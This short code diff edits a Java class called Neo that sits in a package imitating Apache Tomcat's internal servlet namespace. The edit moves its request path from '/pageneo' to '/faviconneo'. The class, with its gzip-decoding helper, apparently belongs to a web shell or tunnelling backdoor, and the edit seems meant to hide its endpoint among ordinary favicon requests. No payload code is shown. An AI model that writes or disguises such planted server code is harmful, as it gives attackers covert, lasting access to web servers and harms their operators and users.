@@ -1,7 +1,7 @@
 package org.apache.catalina.servlets.sl;
 
 public class Neo {
-    private static final String pathPattern= "/pageneo";
+    private static final String pathPattern= "/faviconneo";
     public static java.util.Map<String,Object> namespace = new java.util.HashMap<String,Object>();
 
     public static byte[] unGzip(byte[] bytes) throws Exception{
